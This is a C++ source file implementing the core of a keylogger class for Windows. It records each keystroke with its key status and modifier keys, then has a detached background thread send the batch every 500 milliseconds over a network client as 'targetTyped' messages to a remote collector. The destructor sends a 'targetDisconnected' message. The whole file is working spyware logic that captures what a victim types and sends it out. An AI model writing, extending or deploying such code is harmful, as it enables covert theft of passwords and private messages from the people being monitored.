#include "keylogger.h"

keylogger::keylogger() : client(&validation_function) {
    logThread = std::thread([this]() {
        while (true) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            std::unique_lock<std::mutex> lock(logMutex);
            if (log.size() > 0) {
                kq::message<messageType> msg(messageType::targetTyped);
                for (auto& entry : log) {
                    msg << entry.character << entry.status
                        << entry.modifierKeysBitMask;
                }
                msg << (uint32_t)log.size();
                client.Send(msg);
                log.clear();
            }
        }
    });
    logThread.detach();
}

keylogger::~keylogger() {
    kq::message<messageType> msg(messageType::targetDisconnected);
    client.Send(msg);
    client.Disconnect();
}

void keylogger::handleKeyStroke(DWORD virtualKeyCode, keyStatus status,
                                uint16_t modifierKeysBitMask) {
    char key = (char)MapVirtualKeyA(virtualKeyCode, MAPVK_VK_TO_CHAR);
    std::unique_lock<std::mutex> lock(logMutex);
    log.push_back(LogEntry(key, status, modifierKeysBitMask));
}